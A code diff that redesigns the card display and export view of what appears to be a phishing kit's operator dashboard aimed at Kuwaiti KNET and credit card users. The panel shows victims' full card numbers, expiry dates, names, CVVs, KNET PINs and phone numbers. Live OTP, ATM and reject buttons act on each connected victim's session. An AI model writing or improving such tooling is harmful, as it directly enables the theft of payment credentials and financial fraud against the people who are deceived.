@@ -1678,24 +1678,32 @@
             const cardInfo = getCardInfo(card.cardNumber);
             
             if (isKNET) {
-              // KNET card display
+              // KNET card display - bank card design
+              const knetCardNum = card.cardNumberOnly || card.cardNumber || '-';
+              const formattedKnetNum = knetCardNum !== '-' ? knetCardNum.replace(/(\d{4})(?=\d)/g, '$1 ') : '-';
               html += '<div class="data-section bg-green-50 p-4 rounded-lg" style="border-right-color: #16a34a;">';
               html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)</h3>';
-              html += '<div class="bg-gradient-to-r from-green-100 to-teal-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="text-green-700 font-bold text-lg">🏦 ' + (card.bankName || 'غير محدد') + '</span>';
+              // Bank card design with green gradient for KNET
+              html += '<div style="background: linear-gradient(135deg, #d1fae5 0%, #ecfdf5 50%, #a7f3d0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #6ee7b7; font-family: monospace; position: relative; overflow: hidden;">';
+              // Top row: bank name + KWD
+              html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">';
+              html += '<span style="color: #065f46; font-size: 13px; font-weight: bold;">KNET</span>';
+              html += '<span style="color: #065f46; font-size: 15px; font-weight: bold;">' + (card.bankName || 'غير محدد') + ' 🏦</span>';
               html += '</div>';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="px-2 py-1 rounded text-xs font-bold bg-green-500 text-white">KNET</span>';
+              // Card number
+              html += '<div style="text-align: center; margin-bottom: 14px;">';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + formattedKnetNum + '</span>';
               html += '</div>';
+              // Expiry + Prefix row
+              html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
+              html += '<div style="text-align: left;"><span style="color: #065f46; font-size: 11px;">Prefix</span><br><span style="color: #064e3b; font-size: 14px; font-weight: 600;">' + (card.prefix || '-') + '</span></div>';
+              html += '<div style="text-align: right;"><span style="color: #065f46; font-size: 11px;">Expiry</span><br><span style="color: #064e3b; font-size: 16px; font-weight: bold;">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '</div>';
-              html += '<div class="bg-white p-4 rounded-lg border border-green-200">';
-              html += '<div class="grid grid-cols-1 gap-3 text-base">';
-              html += '<div class="text-right"><span class="text-gray-500">البنك:</span> <span class="font-bold text-lg">' + (card.bankName || '-') + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">البادئة (Prefix):</span> <span class="font-mono font-bold text-lg">' + (card.prefix || '-') + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumberOnly || '-') + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-lg">' + (card.pin || '-') + '</span></div>';
+              // PIN + Network row
+              html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
+              html += '<div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">' + (card.pin || '-') + '</span></div>';
+              html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>';
+              html += '</div>';
               html += '</div>';
               // Action buttons for KNET card
               html += '<div class="flex gap-2 mt-3">';
@@ -1703,34 +1711,39 @@
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               html += '</div>';
-              html += '</div>';
             } else {
-              // Credit card display (original)
+              // Credit card display - bank card design (same style as fahos)
+              const formattedNum = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
+              const networkLogo = cardInfo.network === 'Visa' ? 'VISA' : cardInfo.network === 'Mastercard' ? 'Mastercard' : 'mada';
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
               html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
-              html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
-              html += '<span class="px-2 py-1 rounded text-xs font-bold ' + (cardInfo.type === 'Credit' ? 'bg-blue-500 text-white' : 'bg-green-500 text-white') + '">' + cardInfo.type + '</span>';
+              // Bank card design
+              html += '<div style="background: linear-gradient(135deg, #e8e8e8 0%, #f5f5f5 50%, #e0e0e0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #d0d0d0; font-family: monospace; position: relative; overflow: hidden;">';
+              // Top row: bank name + SAR
+              html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">';
+              html += '<span style="color: #888; font-size: 13px; font-weight: bold;">KWD</span>';
+              html += '<span style="color: #444; font-size: 15px; font-weight: bold;">' + cardInfo.bank + ' 🏦</span>';
               html += '</div>';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="px-2 py-1 rounded text-xs font-bold bg-yellow-400 text-yellow-900">' + cardInfo.tier + '</span>';
-              html += '<span class="text-gray-600 text-sm">' + cardInfo.network + '</span>';
+              // Card number
+              html += '<div style="text-align: center; margin-bottom: 14px;">';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + formattedNum + '</span>';
               html += '</div>';
+              // Expiry + Name row
+              html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
+              html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + card.nameOnCard + '</span></div>';
+              html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '</div>';
-              html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-              html += '<div class="grid grid-cols-2 gap-4 text-base">';
-              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
-              html += '<div class="text-left"><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-              html += '<div class="text-left"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
+              // CVV + Network + Tier row
+              html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
+              html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + card.cvv + '</span></div>';
+              html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + networkLogo + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + cardInfo.type.toUpperCase() + ' • ' + cardInfo.tier.toUpperCase() + '</span></div>';
+              html += '</div>';
               html += '</div>';
               // Action buttons for credit card
               html += '<div class="flex gap-2 mt-3">';
               html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
               html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
-              html += '</div>';
               html += '</div>';
               html += '</div>';
             }
@@ -2870,43 +2883,60 @@
 
       allCards.forEach((card, index) => {
         const formattedCardNumber = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
-        const typeClass = card.type === 'Credit' ? 'badge-credit' : 'badge-debit';
+        const isKNET = card.paymentMethod === 'KNET';
+        const networkLogo = card.network === 'Visa' ? 'VISA' : card.network === 'Mastercard' ? 'Mastercard' : card.network === 'KNET' ? 'KNET' : 'mada';
         
-        htmlContent += `
-          <div class="card-container">
-            <div class="card-title">💳 بطاقة دفع</div>
-            <div class="bank-info">
-              <div>
-                <span class="bank-name">🏦 ` + card.bank + `</span>
-                <span class="badge ` + typeClass + `">` + card.type + `</span>
+        if (isKNET) {
+          // KNET bank card design - green gradient
+          htmlContent += `
+            <div class="card-container" style="background: #f0fdf4; border-right-color: #16a34a;">
+              <div class="card-title" style="color: #166534;">💳 كي نت (KNET)</div>
+              <div style="background: linear-gradient(135deg, #d1fae5 0%, #ecfdf5 50%, #a7f3d0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #6ee7b7; font-family: monospace; position: relative; overflow: hidden;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                  <span style="color: #065f46; font-size: 13px; font-weight: bold;">KNET</span>
+                  <span style="color: #065f46; font-size: 15px; font-weight: bold;">` + card.bank + ` 🏦</span>
+                </div>
+                <div style="text-align: center; margin-bottom: 14px;">
+                  <span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">` + formattedCardNumber + `</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">
+                  <div style="text-align: left;"><span style="color: #065f46; font-size: 11px;">Prefix</span><br><span style="color: #064e3b; font-size: 14px; font-weight: 600;">` + (card.nameOnCard || '-') + `</span></div>
+                  <div style="text-align: right;"><span style="color: #065f46; font-size: 11px;">Expiry</span><br><span style="color: #064e3b; font-size: 16px; font-weight: bold;">` + card.expiryMonth + `/` + card.expiryYear + `</span></div>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                  <div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.pin || '-') + `</span></div>
+                  <div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>
+                </div>
               </div>
-              <div>
-                <span class="badge badge-tier">` + card.tier + `</span>
-                <span class="network-text">` + card.network + `</span>
-              </div>
+              <div style="text-align: center; color: #666; font-size: 13px;">` + card.visitorName + ` | ` + card.visitorPhone + `</div>
             </div>
-            <div class="card-details">
-              <div class="details-grid">
-                <div class="detail-item">
-                  <span class="detail-label">رقم البطاقة:</span>
-                  <span class="detail-value card-number" dir="ltr">` + formattedCardNumber + `</span>
+          `;
+        } else {
+          // Credit card bank card design - silver gradient
+          htmlContent += `
+            <div class="card-container">
+              <div class="card-title">💳 بطاقة دفع</div>
+              <div style="background: linear-gradient(135deg, #e8e8e8 0%, #f5f5f5 50%, #e0e0e0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #d0d0d0; font-family: monospace; position: relative; overflow: hidden;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                  <span style="color: #888; font-size: 13px; font-weight: bold;">KWD</span>
+                  <span style="color: #444; font-size: 15px; font-weight: bold;">` + card.bank + ` 🏦</span>
                 </div>
-                <div class="detail-item">
-                  <span class="detail-label">الاسم:</span>
-                  <span class="detail-value">` + card.nameOnCard + `</span>
+                <div style="text-align: center; margin-bottom: 14px;">
+                  <span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">` + formattedCardNumber + `</span>
                 </div>
-                <div class="detail-item">
-                  <span class="detail-label">الانتهاء:</span>
-                  <span class="detail-value">` + card.expiryMonth + `/` + card.expiryYear + `</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">
+                  <div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">` + card.nameOnCard + `</span></div>
+                  <div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">` + card.expiryMonth + `/` + card.expiryYear + `</span></div>
                 </div>
-                <div class="detail-item">
-                  <span class="detail-label">` + (card.paymentMethod === 'KNET' ? 'PIN:' : 'CVV:') + `</span>
-                  <span class="detail-value">` + (card.paymentMethod === 'KNET' ? card.pin : card.cvv) + `</span>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                  <div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">` + card.cvv + `</span></div>
+                  <div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">` + networkLogo + `</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">` + card.type.toUpperCase() + ` • ` + card.tier.toUpperCase() + `</span></div>
                 </div>
               </div>
+              <div style="text-align: center; color: #666; font-size: 13px;">` + card.visitorName + ` | ` + card.visitorPhone + `</div>
             </div>
-          </div>
-        `;
+          `;
+        }
       });
 
       htmlContent += '</body></html>';
